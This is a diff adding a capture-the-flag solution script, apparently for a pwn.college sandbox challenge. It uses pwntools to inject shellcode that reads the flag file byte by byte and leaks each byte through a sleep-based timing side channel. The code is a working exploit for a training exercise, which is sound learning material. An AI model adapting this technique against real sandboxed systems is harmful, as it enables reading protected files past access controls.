@@ -309,6 +309,71 @@ start:
 ==========================================================================================
 
 # 11
+# python file
+import pwn
+import time
+import signal
+
+
+pwn.context.arch = "amd64"
+pwn.context.encoding = "latin"
+
+iteration_progress = pwn.log.progress("PROGRESS")
+flag_progress = pwn.log.progress("FLAG")
+
+flag = b""
+
+for i in range(0,100):
+    for b in range(256):
+
+        iteration_progress.status(f"Iteration {i}, Byte {b}")
+
+        start = time.time()
+
+        #alarm = process dies after set time
+        with pwn.process(["/challenge/babyjail_level10", "/flag"], level="CRITICAL") as target:
+            #pwn.info(target.readrepeat(1))
+
+            target.send(pwn.asm(f"""
+            //allocate room to stack
+            sub rsp, 0x1000
+
+            //reading single byte from flag
+            {pwn.shellcraft.read(3, "rsp", i)}
+            {pwn.shellcraft.read(3, "rsp", 1)}
+            xor rax, rax
+            mov al, [rsp]
+
+            //compare single byte to hex 80
+            cmp rax, {b}
+            jne crash
+
+            sleep:
+            lea rdi, [rip+time]
+            mov rax, SYS_nanosleep
+            syscall
+            
+            crash:
+            
+
+            time:
+            .8byte 2
+            .8byte 0
+            
+            """))
+
+            target.poll(True)
+
+        end = time.time()
+            #pwn.info(target.readrepeat(1))
+        if end - start > 2:
+            flag+= bytes([b])
+            flag_progress.status(repr(flag))
+            break
+
+        #print(b, end - start)
+
+
 #byte iteration 12 -> {}
 # 15 -> 7
 # 26 -> Y
